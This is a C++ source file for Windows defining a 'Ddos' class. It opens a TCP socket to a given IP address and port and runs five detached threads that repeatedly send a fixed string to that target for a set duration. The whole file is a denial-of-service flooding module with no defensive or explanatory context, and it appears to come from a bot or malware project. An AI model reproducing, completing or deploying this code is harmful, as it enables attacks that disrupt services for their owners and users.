#include "Ddos.hpp"

Ddos::Ddos() {
	this->_duration = 0;
}

Ddos::~Ddos() {
	closesocket(this->_sock);
	WSACleanup();
}

Ddos &Ddos::operator=(const Ddos &obj) {
    return (*this);
}

Ddos::Ddos(const Ddos &obj) {

}

void Ddos::update() {
	connect(this->_sock, (SOCKADDR *)&this->_sin, sizeof(this->_sin));
	clock_t start = clock();
	while (this->_status == RUNNING)
	{
		send(this->_sock, "Hello dear reverser\r\n", 22, 0);
		if ((((double)clock() - start) / CLOCKS_PER_SEC) > this->_duration)
			break;
	}
}

void Ddos::setup() {
	WSADATA WSAData;

	WSAStartup(MAKEWORD(2, 0), &WSAData);
	this->_sock = socket(AF_INET, SOCK_STREAM, 0);
	
}

void Ddos::start(std::string const &ip, int port, int duration) {
	this->_status = RUNNING;
	this->_duration = duration;

	this->_sin.sin_addr.s_addr = inet_addr(ip.c_str());
	this->_sin.sin_family = AF_INET;
	this->_sin.sin_port = htons(port);

	for (size_t i = 0; i < 5; i++)
	{
		this->_thread = std::thread(&Ddos::update, this);
		this->_thread.detach();
	}
}